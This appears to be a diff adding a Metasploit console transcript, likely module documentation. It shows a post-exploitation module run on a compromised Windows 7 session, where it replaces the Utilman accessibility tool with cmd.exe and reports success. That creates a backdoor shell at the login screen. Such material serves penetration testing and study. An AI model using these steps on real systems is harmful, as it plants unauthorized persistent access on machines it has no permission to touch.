@@ -1,0 +1,22 @@
+msf exploit(psexec) > use post/windows/manage/eoa_cmd
+msf post(eoa_cmd) > show options 
+
+Module options (post/windows/manage/eoa_cmd):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+msf post(eoa_cmd) > set SESSION 1
+SESSION => 1
+msf post(eoa_cmd) > run
+
+[*] Please make sure you have migrated to a user process.
+[*] System info : Windows 7 (Build 7601, Service Pack 1).
+[*] Logged on Users # :  1
+[*] Executing script as user : [ WIndows-PC\drin ] on process : [ 3584 ]
+[*] Injecting CMD.exe to Utilman ...
+
+[+] Injection completed successfully.
+
+[*] Post module execution completed
